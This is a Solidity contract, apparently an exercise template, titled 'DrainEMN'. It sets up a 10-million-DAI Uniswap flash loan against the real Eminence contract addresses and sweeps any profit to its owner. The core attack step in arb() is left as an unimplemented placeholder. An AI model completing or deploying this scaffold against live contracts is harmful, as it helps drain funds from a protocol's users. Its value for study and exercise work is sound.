pragma solidity =0.6.6;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

import "hardhat/console.sol";

interface EminenceCurrency {
    function buy(uint _amount, uint _min) external returns (uint _bought);
    function sell(uint _amount, uint _min) external returns (uint _bought);
}

contract DrainEMN is IUniswapV2Callee {
    address private constant factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant emn = 0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8;
    address private constant eaave = 0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198;
    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    uint constant borrowAmount = 10000000 ether;

    address immutable owner;
    IUniswapV2Pair immutable pair;
    EminenceCurrency immutable EMN;
    EminenceCurrency immutable EAAVE;

    constructor() public {
        address weth = IUniswapV2Router01(router).WETH();
        pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, dai, weth));
        EMN = EminenceCurrency(emn);
        EAAVE = EminenceCurrency(eaave);
        owner = msg.sender;
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        console.log("[+] Got flash loan");
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(msg.sender == IUniswapV2Factory(factory).getPair(token0, token1));
        assert(amount1 == 0);
        assert(token0 == dai);
        arb(amount0);
        uint fee = (amount0 * 3) / 997 + 1;
        uint amountToRepay = amount0 + fee;
        console.log("[+] Paying back flash loan");
        IERC20(token0).transfer(msg.sender, amountToRepay);
        sweep();
    }

    function drain() external {
        require(msg.sender == owner);
        console.log("[+] Attempting to drain some DAI...");
        pair.swap(borrowAmount, 0, address(this), abi.encode(msg.sender));
    }

    function sweep() internal {
        uint profits = IERC20(dai).balanceOf(address(this));
        console.log("[+] Sweeping profits of %s DAI", profits / 10**18);
        if (profits > 0) {
            IERC20(dai).transfer(owner, profits);
        }
    }

    function arb(uint fundingAmount) internal {
        console.log("[+] Attempting arbitrage");
        // your code here
        revert("Unimplemented");
    }
}
